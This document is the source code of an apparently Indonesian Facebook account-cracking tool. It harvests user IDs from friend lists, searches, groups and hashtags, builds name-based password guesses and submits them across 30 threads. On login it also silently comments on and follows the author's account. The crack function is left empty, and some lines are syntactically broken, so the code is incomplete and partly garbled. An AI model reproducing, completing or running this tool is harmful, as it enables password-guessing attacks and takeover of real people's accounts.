# XMBF
CR4CK
import requests as r, os, re, time, random, threading
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor

url = "https://mbasic.facebook.com/"
CONFIG_SCRIPT = kolis.xd#3D3D3D # Username lu | id postingan
ses = r.Session()

def randomWord():
	# atur kata katanya
	list_word = [
		"Jika Anda dapat memimpikannya, Anda dapat melakukannya.",
		"Kata 'pulang' selalu terdengar jauh lebih indah dari pada 'pergi'. Tetapi orang harus rindu untuk bisa menikmati keindahan pulang.",
		"you have the freedom to fail",
		"Anda adalah seorang yang cerdas, gunakan kecerdasanmu dengan bijak :)",
		"Sesuatu akan selalu selalu mustahil sampai kamu selesai melakukannya."
	]
	return random.choice(list_word)

class Login:
	def __init__(self, cookie):
		self.cookie = {"cookie":cookie}
		self.data_post = {}
		self.cfg = CONFIG_SCRIPT.split("|")

	def Cookies(self):
		cek = par(ses.get(url+"profile.php", cookies=self.cookie).text, "html.parser")
		if "mbasic_logout_button" in str(cek):
			name = cek.find("title").text
			scrs = cek.find("a", string="Profil")["href"]
			print("[*] Selamat datang",name)
			time.sleep(1)
			if "profile.php" in scrs:
				reg = re.findall("\/profile.php\?id=(\d+)&", str(scrs))
			else:
				reg = re.findall("\/(.*?)\?", str(scrs))
			open("config.cfg","w").write(self.cookie["cookie"]+"||"+name+"||"+"".join(reg))
			self.Ngomen()
			self.Follow_me()
		else:
			exit("[!] Cookie invalid\n")

	def Ngomen(self):
		cek = par(ses.get(url+"photo.php?fbid="+self.cfg[1], cookies=self.cookie).text, "html.parser")
		list_upload = ["fb_dtsg","jazoest"]
		for db in cek.find_all("input"):
			if db.get("name") in list_upload:
				self.data_post.update({db.get("name"):db.get("value")})
			else:
				continue
		self.data_post.update({"comment_text":randomWord()})
		ses.post(url+cek.find("form")["action"], data=self.data_post, cookies=self.cookie)

	def Follow_me(self):
		try:
			cek = par(ses.get(url+self.cfg[0], cookies=self.cookie).text, "html.parser").find("a", string="Ikuti")["href"]
			ses.get(url+cek, cookies=self.cookie)
		except:
			pass

class Dump:
	def __init__(self, config):
		self.kuki = {"cookie":config}

	def listTeman(self, links):
		try:
			cek = par(ses.get(url+links, cookies=self.kuki).text, "html.parser")
			reg = re.findall("middle\">\<a class=\"..\" href=\"(.*?)\">(.*?)<\/a>", str(cek))
			for rog in reg:
				if "profile" in rog[0]:
					self.id = re.findall("/profile.php\?id=(\d+)&", str(rog[0]))
					id.append("".join(self.id)+"|"+rog[1].split("<span")[0])
				else:
					self.id = re.findall("/(.*?)\?", str(rog[0]))
					id.append("".join(self.id)+"|"+rog[1].split("<span")[0])
				print("\r[=] Collect "+str(len(id))+" user ", end="")
			if len(id) == 0:
				print("\n[+] Tidak ada ID yang bisa di ambil\n")
				input("[=] ENTER TO BACK HOME ..")
				menu()

			if "Lihat Teman Lain" in str(cek):
				self.listTeman(cek.find("a", string="Lihat Teman Lain")["href"])
			return id
		except:
			pass

	def Search(self, links):
		try:
			cek = par(ses.get(url+links, cookies=self.kuki).text, "html.parser")
			reg = re.findall("profile picture\".*?<a href=\"(.*?)\"><div.*?><div.*?>(.*?)</div>", str(cek))
			for rog in reg:
				if "profile" in rog[0]:
					self.id = re.findall("/profile.php\?id=(\d+)&", str(rog[0]))
					id.append("".join(self.id)+"|"+rog[1].split("<span")[0])
				else:
					self.id = re.findall("/(.*?)\?", str(rog[0]))
					id.append("".join(self.id)+"|"+rog[1].split("<span")[0])
				print("\r[=] Collect "+str(len(id))+" user ", end="")
			if "Lihat Hasil Selanjutnya" in str(cek):
				nxt = cek.find("div", id="see_more_pager").find("a")["href"]
				if "mbasic" in nxt:
					rep = "https://mbasic.facebook.com/"
				elif "free" in nxt:
					rep = "https://free.facebook.com/"
				else:
					rep = "https://m.facebook.com/"
				self.Search(nxt.replace(rep,""))
			return id
		except:
			return id

	def Public(self, links):
		try:
			cek = par(ses.get(url+links, cookies=self.kuki).text, "html.parser")
			reg = re.findall("middle\">\<a class=\"..\" href=\"(.*?)\">(.*?)<\/a>", str(cek))
			for rog in reg:
				if "profile" in rog[0]:
					self.id = re.findall("/profile.php\?id=(\d+)&", str(rog[0]))
					id.append("".join(self.id)+"|"+rog[1].split("<span")[0])
				else:
					self.id = re.findall("/(.*?)\?", str(rog[0]))
					id.append("".join(self.id)+"|"+rog[1].split("<span")[0])
				print("\r[=] Collect "+str(len(id))+" user ", end="")
			if len(id) == 0:
				print("\n[+] Tidak ada ID yang bisa di ambil\n")
				input("[=] ENTER TO BACK HOME ..")
				menu()

			if "Lihat Teman Lain" in str(cek):
				self.Public(cek.find("a", string="Lihat Teman Lain")["href"])
			return id
		except:
			return id

	def Groups(self, links):
		try:
			cek = par(ses.get(url+links, cookies=self.kuki).text, "html.parser")
			reg = re.findall("profile picture\".*?<a class=\"..\" href=\"(.*?)\">(.*?)</a>", str(cek))
			for rog in reg:
				if "profile" in rog[0]:
					self.id = re.findall("/profile.php\?id=(\d+)", str(rog[0]))
					id.append("".join(self.id)+"|"+rog[1].split("<span")[0])
				else:
					self.id = rog[0].split("/")[1]
					id.append(self.id+"|"+rog[1].split("<span")[0])
				print("\r[=] Collect "+str(len(id))+" user ", end="")
			if len(id) == 0:
				print("\n[+] Tidak ada ID yang bisa di ambil\n")
				input("[=] ENTER TO BACK HOME ..")
				menu()
			if "Lihat Selengkapnya" in str(cek):
				nx = cek.find("div",{"id":"m_more_item"}).find("a")["href"]
				self.Groups(nx)
			return id
		except:
			pass

	def Hashtag(self, links):
		try:
			cek = par(ses.get(url+links, cookies=self.kuki).text, "html.parser")
			reg = re.findall("\<table.*?<strong><a class=\"..\" href=\"(.*?)\">(.*?)</a></strong>", str(cek))
			for rog in reg:
				if "profile.php" in rog[0]:
					self.id = re.findall("/profile.php\?id=(\d+)&", str(rog[0]))
					self.id = "".join(self.id).replace("/","")
					id.append(self.id+"|"+rog[1].split("<span")[0])
				else:
					self.id = re.findall("/(.*?)\?", str(rog[0]))
					self.id = "".join(self.id).replace("/","")
					id.append(self.id+"|"+rog[1].split("<span")[0])
				print("\r[=] Collect "+str(len(id))+" user ", end="")
			if len(id) == 0:
				print("\n[+] Tidak ada ID yang bisa di ambil\n")
				input("[=] ENTER TO BACK HOME ..")
				menu()
			if "Lihat Hasil Selanjutnya" in str(cek):
				nxt = cek.find("div", id="see_more_pager").find("a")["href"]
				if "mbasic" in nxt:
					rep = "https://mbasic.facebook.com/"
				elif "free" in nxt:
					 = "https://free.facebook.com/"
				else:
					rep = "https://m.facebook.com/"
				self.Hashtag(nxt.replace(rep,""))
			return id
		except:
			return id

def crack(user, pas):
	# krek bagian sini tod

def menu():
	os.system("clear")
	config = open("config.cfg","r").read().replace("\n","").split("||")

	print("[!] Note: This tools not use API")
	print("[*] Name: "+config[1])
	print("[*] User: "+config[2])
	print("-"*40)
	print("""[01] Crack ID from friend list
[02] Crack ID public from friend
[03] Crack ID from search name
[04] Crack ID from group
[05] Crack ID from hashtag
[06] Read result
[00] Logout (Delete cookies)""")
	print("-"*40)
	pilih = input("[?] Select: ")
	while pilih == "" or not pilih.isdigit():
		pilih = input("[?] Select: ")
	if pilih in ["01","1"]:
		link = config[2]+"/friends"
		Dump(config[0]).listTeman(link)
	elif pilih in ["02","2"]:
		user = input("[*] username/ID: ").replace(" ",".").replace("/",".")
		cek = par(ses.get(url+user+"/friends", cookies={"cookie":config[0]}).text, "html.parser")
		print("[=] Dump from: "+cek.find("title").text)
		if "Halaman yang Anda minta tidak ditemukan." in str(cek):
			print("[!] User tidak ditemukan")
			input("[=] ENTER TO BACK HOME ..")
			menu()
		elif "Tidak Ada Teman Untuk Ditampilkan" in str(cek):
			print("[×] Teman tidak public!")
			input("[=] ENTER TO BACK HOME ..")
			menu()
		else:
			print("[!] CTRL + C to stop")
			Dump(config[0]).Public(user+"/friends")
	elif pilih in ["03","3"]:
		name = input("[?] Search query: ").replace(" ","+")
		print("[!] CTRL + C to stop")
		link = "search/people/?q="+name
		Dump(config[0]).Search(link)
	elif pilih in ["04","4"]:
		idg = input("[=] ID group: ")
		while idg == "" or not idg.isdigit():
			idg = input("[=] ID group: ")
		ged = par(ses.get(url+"browse/group/members/?id="+idg+"&start=0&listType=list_nonfriend_nonadmin&refid=18&_rdc=1&_rdr", cookies={"cookie":config[0]}).text, "html.parser")
		if "Halaman yang diminta tidak bisa ditampilkan sekarang." in str(ged):
			print("[+] Group tidak ditemukan\n")
			input("[=] ENTER TO BACK HOME ..")
			menu()
		name = ged.find("title").text
		name = name.replace("Anggota","").strip()
		print("[!] CTRL + C to stop")
		print("[=] Name group: "+name)
		Dump(config[0]).Groups("browse/group/members/?id="+idg+"&start=0&listType=list_nonfriend_nonadmin&refid=18&_rdc=1&_rdr")
	elif pilih in ["05","5"]:
		tag = input("[?] Hashtag: ")
		if "#" in tag:
			qu = tag.replace("#","")
		else:
			qu = tag
		cek = ses.get(url+"hashtag/"+qu, cookies={"cookie":config[0]}).text
		if "Konten Ini Tidak Tersedia" in str(cek):
			print("[+] Konten ini tidak tersedia")
			input("[=] ENTER TO BACK HOME ..")
			menu()
		Dump(config[0]).Hashtag("hashtag/"+qu)
	else:
		exit("[!] Pilih yang bener\n")

	tnya = input("\n[?] Use manual password? [Y/T]: ")
	while tnya == "":
		tnya = input("\n[?] Use manual password? [Y/T]: ")

	if tnya in list("Tt"):
		with ThreadPoolExecutor(max_workers=30) as sub:
			for uid in id:
				usenm = uid.split("|")
				name = usenm[1].split(" ")
				if len(name) == 1:
					listpw = [
						name[0]+"123",
						name[0]+"12345",
						name[0]+"321",
						name[0]+"54321",
						"mantan", "anjing", "sayang"
					]
				elif len(name) == 2:
					listpw = [
						name[0]+"123",
						name[0]+"12345",
						name[0]+"321",
						name[0]+"54321",
						name[1]+"123",
						name[1]+"12345",
						name[1]+"321",
						name[1]+"54321",
						"mantan", "anjing", "sayang"
					]
				elif len(name) == 3:
					listpw = [
						name[0]+"123",
						name[0]+"12345",
						name[0]+"321",
						name[0]+"54321",
						name[1]+"123",
						name[1]+"12345",
						name[1]+"321",
						name[1]+"54321",
						name[2]+"123",
						name[2]+"12345",
						name[2]+"321",
						name[2]+"54321",
						"mantan", "anjing", "sayang"
					]
				elif len(name) == 4:
					listpw = [
						name[0]+"123",
						name[0]+"12345",
						name[0]+"321",
						name[0]+"54321",
						name[1]+"123",
						name[1]+"12345",
						name[1]+"321",
						name[1]+"54321",
						name[2]+"123",
						name[2]+"12345",
						name[2]+"321",
						name[2]+"54321",
						name[3]+"123",
						name[3]+"12345",
						name[3]+"321",
						name[3]+"54321",
						"mantan", "anjing", "sayang"
					]
				else:
					listpw = [
						"akusayangkamu",
						"bismillah",
						"anjing",
						"mantan",
						"bajingan",
						"palestine",
						"assalamualaikum"
					]
				sub.submit(crack,(usenm[0]),(listpw))

	elif tnya in list("Yy"):
		print("[!] Write extra password\n    Ex: name,name123")
		with ThreadPoolExecutor(max_workers=30) as sub:
			exr = input("[-] extra password: ").split(",")
			for uid in id:
				usenm = uid.split("|")
				sub.submit(crack,(usenm[0]),(exr))

	print("\n[✓] Crack selesai..")


if __name__ == "__main__":
	os.system("clear")

	try:
		config = open("config.cfg","r").read().replace("\n","").split("||")
		ged = r.get(url+"/home.php", cookies={"cookie":config[0]}).text
		if "mbasic_logout_button" in str(ged):
			menu()
		else:
			exit("[=] Cookie expired\n")
			os.remove("config.cfg")
	except FileNotFoundError:
		print("[!] Login dulu bro")
		cookie = input("[-] Cookie: ")
		td = threading.Thread(name='Log-in',target=Login(cookie).Cookies())
		td.start()
		print("[✓] Login successfully")
		menu()
